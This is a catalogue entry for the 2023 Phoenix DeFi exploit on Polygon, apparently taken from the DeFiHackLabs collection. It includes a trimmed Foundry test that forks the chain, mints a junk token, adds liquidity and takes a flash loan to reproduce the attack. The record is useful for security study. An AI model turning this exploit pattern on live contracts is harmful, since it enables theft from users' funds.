# [?] - Phoenix - Access Control & Arbitrary External Call

## Summary
Severity: Unknown
Chain: Polygon
Component: Phoenix
Published: 2023-03-07
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/Phoenix_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$100k
References:
- https://twitter.com/HypernativeLabs/status/1633090456157401088
- https://polygonscan.com/tx/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4

```solidity
contract ContractTest is Test {
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    SHITCOIN MYTOKEN;
    IPHXPROXY phxProxy = IPHXPROXY(0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de);
    Uni_Router_V2 Router = Uni_Router_V2(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
    address dodo = 0x1093ceD81987Bf532c2b7907B2A8525cd0C17295;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("polygon", 40_066_946);
        vm.label(address(USDC), "USDC");
        vm.label(address(WETH), "WETH");
        vm.label(address(phxProxy), "phxProxy");
        vm.label(address(Router), "Router");
        vm.label(address(dodo), "dodo");
    }

    function testExploit() public {
        deal(address(WETH), address(this), 7 * 1e15);
        MYTOKEN = new SHITCOIN();
        MYTOKEN.mint(1_500_000 * 1e18);
        MYTOKEN.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
        Router.addLiquidity(address(MYTOKEN), address(WETH), 7 * 1e15, 7 * 1e15, 0, 0, address(this), block.timestamp);

        DVM(dodo).flashLoan(0, 8000 * 1e6, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/Phoenix_exp.sol_
